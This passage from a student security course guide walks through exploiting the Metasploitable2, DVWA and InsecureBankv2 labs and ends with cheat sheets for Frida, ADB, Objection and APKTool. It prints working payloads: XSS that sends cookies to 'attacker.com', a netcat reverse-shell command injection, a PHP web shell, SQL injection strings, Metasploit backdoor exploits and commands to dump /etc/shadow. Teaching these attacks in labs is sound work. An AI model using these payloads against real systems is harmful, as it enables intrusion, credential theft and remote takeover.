grep "activity" AndroidManifest.xml | grep -v "MAIN"

# Check for hardcoded test credentials
grep -r "password\|admin\|test\|debug" . --include="*.smali"
```

---

## 16. Metasploitable2 Lab Extension

Metasploitable2 is an intentionally vulnerable Linux VM for practicing network and web exploitation.

### 16.1 Setup

1. Download Metasploitable2 from SourceForge
2. Import `.vmdk` into VirtualBox/VMware
3. Set network to **Host-Only** or **NAT** (never Bridged on a real network)
4. Boot it; default credentials: `msfadmin` / `msfadmin`
5. Find its IP: `ifconfig` on the VM

### 16.2 Reconnaissance

```bash
# Discover the target
nmap -sV -O 192.168.56.101

# Full port scan
nmap -p- 192.168.56.101

# Aggressive scan (OS, version, scripts)
nmap -A 192.168.56.101

# Common ports you'll find on Metasploitable2:
# 21 - FTP (vsftpd 2.3.4 - backdoor!)
# 22 - SSH
# 23 - Telnet
# 25 - SMTP
# 80 - HTTP (DVWA, Mutillidae)
# 139/445 - Samba
# 3306 - MySQL
# 5432 - PostgreSQL
# 6667 - IRC (UnrealIRCd backdoor!)
# 8180 - Tomcat
```

### 16.3 Exploitation Examples

**FTP Backdoor (vsftpd 2.3.4):**

```bash
# This version has a backdoor — sending ":)" in username opens shell on port 6200
telnet 192.168.56.101 21
USER backdoor:)
PASS anything

# In a new terminal:
nc 192.168.56.101 6200
id   # → root!
```

**Samba Usermap Script (MS-08-067 equivalent on Linux):**

```bash
# Using Metasploit
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
run
# You get a root shell
```

**UnrealIRCd Backdoor:**

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
run
```

**DVWA (Web App) — SQL Injection:**

```
http://192.168.56.101/dvwa/
Login: admin / password
Security: Low

# In SQL Injection field:
1' OR '1'='1       # Basic bypass
1' UNION SELECT 1,2--   # Column enumeration
1' UNION SELECT user(),database()--  # Get DB info
```

**DVWA — XSS (Reflected):**

```html
<!-- In XSS field with Low security: -->
<script>
  alert('XSS')
</script>
<script>
  document.location = 'http://attacker.com/steal?c=' + document.cookie
</script>
```

**DVWA — Command Injection:**

```
# In ping field with Low security:
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; nc -e /bin/bash YOUR_IP 4444
```

**Mutillidae (on same Metasploitable2):**

```
http://192.168.56.101/mutillidae/
# Contains: SQLi, XSS, CSRF, IDOR, File Inclusion, and more
```

### 16.4 Post-Exploitation

```bash
# After getting a shell, gather info
id
whoami
uname -a
cat /etc/passwd
cat /etc/shadow   # Password hashes (if root)

# Privilege escalation check
sudo -l
find / -perm -u=s -type f 2>/dev/null   # SUID binaries
cat /etc/crontab                          # Scheduled tasks

# Crack password hashes (on your machine)
john /path/to/shadow --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 17. Testing Your Own Created Websites

As a software engineer, you can set up your own vulnerable web apps. Here's what to test.

### 17.1 Set Up a Local Test Environment

```bash
# Using XAMPP (PHP + MySQL + Apache)
# Or Docker:
docker run -d -p 80:80 -p 443:443 webdevops/php-apache
```

### 17.2 Web Vulnerabilities to Test

**SQL Injection:**

```sql
-- In any input field, try:
' OR '1'='1'--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--

-- Test with sqlmap (automated):
sqlmap -u "http://localhost/page.php?id=1" --dbs
sqlmap -u "http://localhost/page.php?id=1" -D mydb --tables
sqlmap -u "http://localhost/page.php?id=1" -D mydb -T users --dump
```

**Cross-Site Scripting (XSS):**

```html
<!-- Reflected XSS -->
<script>
  alert(1)
</script>
">
<script>
  alert(1)
</script>
<img src="x" onerror="alert(1)" />

<!-- Stored XSS (in comments, profiles) -->
<script>
  fetch('http://attacker.com/steal?c=' + document.cookie)
</script>
```

**CSRF (Cross-Site Request Forgery):**

```html
<!-- Craft a page that makes a request on behalf of logged-in user -->
<form action="http://yoursite.com/transfer" method="POST">
  <input name="amount" value="1000" />
  <input name="to" value="attacker" />
</form>
<script>
  document.forms[0].submit()
</script>
```

**IDOR (Insecure Direct Object Reference):**

```
# Change user ID in URL
http://localhost/profile?id=1   → your profile
http://localhost/profile?id=2   → someone else's profile (if no auth check)
```

**File Upload Vulnerability:**

```php
<!-- Upload a PHP shell instead of an image -->
<?php system($_GET['cmd']); ?>
# Save as shell.php
# If uploaded successfully, access: http://localhost/uploads/shell.php?cmd=id
```

**Directory Traversal:**

```
http://localhost/page.php?file=../../../../etc/passwd
http://localhost/page.php?file=....//....//etc/passwd
```

**Security Headers to Check (use browser DevTools or Burp):**

```
Missing: X-Frame-Options → Clickjacking possible
Missing: Content-Security-Policy → XSS easier
Missing: X-Content-Type-Options → MIME sniffing
Missing: Strict-Transport-Security → SSL stripping possible
```

### 17.3 Test Your API Endpoints

```bash
# With Burp Suite intercepting:
# 1. Test authentication bypass
# 2. Test parameter tampering
# 3. Test mass assignment
# 4. Test rate limiting (or lack thereof)

# Tools for API testing:
# Postman — GUI-based API testing
# curl — command line
curl -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
```

---

## 18. Ethical Hacking Methodology (Black / White / Gray Hat)

### 18.1 Hat Definitions

| Hat           | Definition                                                                | Authorization           | Legal?        |
| ------------- | ------------------------------------------------------------------------- | ----------------------- | ------------- |
| **White Hat** | Ethical hacker hired by organization to find vulnerabilities              | Full written permission | Yes           |
| **Gray Hat**  | Hacks without permission but doesn't cause damage; may disclose to vendor | None (often)            | Legally risky |
| **Black Hat** | Malicious hacker for personal gain, damage, theft                         | None                    | No            |

**As a student, you operate as white hat on:**

- Your own systems and websites
- Lab environments (Metasploitable2, DVWA)
- CTF (Capture The Flag) competitions
- Bug bounty programs (with scope)

### 18.2 Penetration Testing Methodology

```
Phase 1: RECONNAISSANCE (Passive)
├── OSINT (open-source intelligence)
├── whois, DNS lookup, Shodan
├── LinkedIn, job postings, social media
└── Google dorks: site:target.com filetype:pdf

Phase 2: SCANNING & ENUMERATION (Active)
├── Port scanning (nmap)
├── Service version detection
├── OS fingerprinting
├── Web crawling (dirb, gobuster)
└── Vulnerability scanning (Nikto, OpenVAS)

Phase 3: EXPLOITATION
├── Use found vulnerabilities
├── Social engineering
├── Password attacks
└── Exploit known CVEs

Phase 4: POST-EXPLOITATION
├── Privilege escalation
├── Lateral movement
├── Data exfiltration (in scope only)
└── Persistence (in scope only)

Phase 5: REPORTING
├── Document all findings
├── Severity ratings (Critical/High/Medium/Low)
├── Proof of concept (screenshots, logs)
└── Remediation recommendations
```

### 18.3 Important Legal Rules for Students

1. **Never test systems you don't own or have written permission for** — even if you think you're helping
2. Bug bounty programs have a defined **scope** — stay within it
3. In CTFs, the rules are set by organizers — follow them
4. Even your university lab systems — check with your professor/IT dept first
5. Cloud environments (AWS, Azure) have their own acceptable use policies
6. **Passive recon** (viewing public info) is generally legal; **active scanning** without permission is not in most countries

---

## 19. Reference Commands Cheat Sheet

### Frida Quick Reference

```bash
# List devices
frida-ls-usb-devices

# List processes
frida-ps -U
frida-ps -Uai   # with package names

# Attach by package name (spawns app)
frida -U -f com.example.app -l script.js --no-pause

# Attach by name (app already running)
frida -U -n "App Name" -l script.js

# Attach by gadget (patched APK)
frida -U Gadget -l script.js

# Inside Frida REPL
%resume          # Resume from paused state
%reload          # Reload current script
%exec path.js    # Run a script in current session
%quit            # Exit
Ctrl+D           # Also quit
```

### ADB Quick Reference

```bash
adb devices                          # List connected devices
adb shell                            # Open shell
adb -s DEVICE_ID shell               # Shell on specific device
adb install app.apk                  # Install APK
adb push file /data/local/tmp/       # Upload file to device
adb pull /data/data/com.app/file ./  # Download file from device
adb logcat                           # View logs
adb logcat -c                        # Clear logs
adb logcat | findstr "keyword"       # Filter logs (Windows)
adb shell ps | grep frida            # Check running processes
adb shell getprop ro.product.cpu.abi # Get architecture
adb shell settings put global http_proxy 192.168.1.x:8080  # Set proxy
adb shell settings put global http_proxy :0                  # Remove proxy
adb shell am start -n "pkg/.Activity" # Launch activity directly
adb shell content query --uri content://sms/inbox  # Query content provider
```

### Objection Quick Reference

```bash
# Connect to running app
objection -g com.example.app explore

# Bypass root detection on startup
objection -g com.example.app explore -s "android root disable"

# Inside Objection shell
android root disable
android ssl unpinning
android hooking list classes
android hooking list methods com.example.MyClass
android hooking watch class_method com.example.MyClass.myMethod --dump-args --dump-return
memory list modules
memory search --string "SECRET"
android intent launch_activity com.example.PostLoginActivity
android filesystem list /data/data/com.example.app
android clipboard monitor
```

### APKTool Quick Reference

```bash
apktool d app.apk                     # Decompile
apktool d app.apk -o output-dir       # Decompile with custom output dir
apktool b output-dir                   # Rebuild
apktool b output-dir --use-aapt2      # Rebuild with AAPT2 (if errors)
apktool b output-dir -o new-app.apk   # Rebuild with custom output name
```

### Signing APKs

```bash
# Create keystore (once)
keytool -genkey -v -keystore test.keystore -alias testkey -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore test.keystore app.apk testkey

# Verify signature
jarsigner -verify app.apk
```

### Frida JavaScript API Quick Reference

```javascript
// Get class reference
const MyClass = Java.use('com.example.MyClass')

// Hook method
MyClass.methodName.implementation = function (arg1) {
  console.log('arg: ' + arg1)
  return this.methodName(arg1) // call original
}

// Hook overloaded method
MyClass.methodName.overload('java.lang.String').implementation = function (s) {
  return false // bypass
}

// Create new Java object
const str = Java.use('java.lang.String').$new('hello')

// Enumerate loaded classes
Java.enumerateLoadedClasses({
  onMatch: function (name) {
    console.log(name)
  },
  onComplete: function () {},
})

// Windows: Find API address
const addr = Module.findExportByName('user32.dll', 'MessageBoxA')
const addr2 = Module.getExportByName('kernel32.dll', 'CreateFileA')

// Windows: Attach interceptor
Interceptor.attach(addr, {
  onEnter: function (args) {
    console.log(args[1].readUtf8String())
  },
  onLeave: function (retval) {
    console.log(retval.toInt32())
  },
})

// Allocate string in memory
const newStr = Memory.allocUtf8String('new value')

// Scan memory
Memory.scan(range.base, range.size, 'hex pattern', {
  onMatch: function (address, size) {},
  onComplete: function () {},
})

// Read/write memory
pointer.readUtf8String()
pointer.readUtf16String()
pointer.writeUtf8String('new value')
```

---

## Appendix: Insecure Banking App Lab (InsecureBankv2)

This is a complete intentionally vulnerable Android banking app for practice.

### Setup

```bash
# Install server (Python 3 version)
cd android-lab-server
pip install -r requirements.txt
python app.py
# Server starts on port 8888

# Install APK on emulator
adb install InsecureBankv2.apk

# App credentials (from developer):
# Username: jack    Password: Jack@123$
# Username: Dinesh  Password: Dinesh@123$

# Configure app: tap ⋮ → Preferences → Server IP → your PC IP → port 8888 → Submit
```

### Vulnerabilities to Find

1. **Cleartext credentials in SharedPreferences** → `adb shell; cat /data/data/.../shared_prefs/*.xml`
2. **SQLite database with user data** → `adb shell; sqlite3 /data/data/.../databases/mydb`
3. **Insecure logging** → `adb logcat | findstr "jack"` during login
4. **Exported activities** → decompile manifest, launch PostLoginActivity directly
5. **Cleartext HTTP traffic** → Burp intercepts login request
6. **Weak cryptography** → decompiled code shows DES encryption with hardcoded key
7. **Root detection** → none (intentionally absent for learning)

---

_Guide compiled from course material on Frida, Objection, APKTool, Burp Suite, mobile security, and Windows reverse engineering. All techniques are for educational purposes on systems you own or have explicit written permission to test._
